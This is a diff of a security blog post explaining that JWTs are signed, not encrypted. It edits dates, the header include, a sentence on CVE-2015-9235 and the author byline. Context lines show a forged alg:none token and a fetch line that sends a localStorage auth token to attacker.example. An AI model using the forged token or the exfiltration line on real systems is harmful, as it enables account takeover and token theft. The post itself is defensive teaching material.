@@ -1,4 +1,5 @@
 ---
+date: 2026-03-26
 layout: base.njk
 title: "JWT is not encryption — Penumbra Forge"
 description: "JWTs are signed, not encrypted. Base64 is not a security boundary. Here's what keeps going wrong with JSON Web Tokens — alg:none attacks, key confusion, payload leaks, and tokens that never expire."
@@ -7,27 +8,14 @@ permalink: /blog/jwt-is-not-encryption/
 
 <link rel="stylesheet" href="/css/blog.css">
 
-<header class="site-header" id="site-header">
-  <a href="/" class="site-header-brand" title="Penumbra Forge">
-    <div class="site-header-orb" aria-hidden="true"><div class="site-header-orb-backlight"></div><div class="site-header-orb-corona"></div><div class="site-header-orb-glow"></div><div class="site-header-orb-edge"></div><div class="site-header-orb-shadow"></div></div>
-  </a>
-  <button class="site-header-toggle" aria-label="Toggle menu"><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5"><line x1="3" y1="5" x2="17" y2="5"/><line x1="3" y1="10" x2="17" y2="10"/><line x1="3" y1="15" x2="17" y2="15"/></svg></button>
-  <nav class="site-header-nav">
-    <a href="/">Home</a>
-    <a href="/tools/">Tools</a>
-    <a href="/blog/" class="active">Blog</a>
-    <a href="/gate/">Gate</a>
-    <a href="/librarian/">Librarian</a>
-    <a href="https://github.com/penumbraforge" target="_blank" rel="noopener">GitHub</a>
-  </nav>
-</header>
+{% include "header.njk" %}
 
 <div class="blog-page">
   <article class="blog-article">
     <div class="blog-article-header">
       <h1>JWT is not encryption</h1>
       <div class="blog-post-meta">
-        <span class="blog-post-date">March 11, 2026</span>
+        <span class="blog-post-date">March 26, 2026</span>
         <span class="blog-post-tag">security</span>
         <span class="blog-post-tag">authentication</span>
         <span class="blog-post-read">7 min read</span>
@@ -68,7 +56,7 @@ permalink: /blog/jwt-is-not-encryption/
 // Forged token (note: no signature after the final dot)
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDQ4NTc2IiwibmFtZSI6IkphbmUgQ2hlbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0Mjk0ODgwMH0.</code></pre>
 
-      <p>This isn't theoretical. CVE-2015-9235 hit the widely used <code>jsonwebtoken</code> Node.js library. Auth0's <code>node-jsonwebtoken</code> before version 4.2.2 would accept <code>alg: "none"</code> and skip signature verification entirely. Thousands of apps were vulnerable.</p>
+      <p>This isn't theoretical. CVE-2015-9235 hit the widely used <code>jsonwebtoken</code> Node.js library. Auth0's <code>node-jsonwebtoken</code> before version 4.2.2 would accept <code>alg: "none"</code> and skip signature verification entirely. The library is one of the most-downloaded auth packages on npm, so the blast radius was enormous.</p>
 
       <div class="blog-callout blog-callout-warning">
         <strong>Fix:</strong> Never let the token tell your server which algorithm to use. Specify the algorithm explicitly when verifying: <code>jwt.verify(token, secret, { algorithms: ['HS256'] })</code>. If your library doesn't support an allowlist, replace it.
@@ -139,8 +127,8 @@ fetch('https://attacker.example/collect?token=' + localStorage.getItem('auth_tok
       <div class="blog-author">
         <div class="blog-author-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
         <div>
-          <div class="blog-author-name">Penumbra Forge</div>
-          <div class="blog-author-role">Engineering</div>
+          <div class="blog-author-name">Shadoe Myers</div>
+          <div class="blog-author-role">Founder, Penumbra Forge</div>
         </div>
       </div>
       <div class="blog-nav-links">
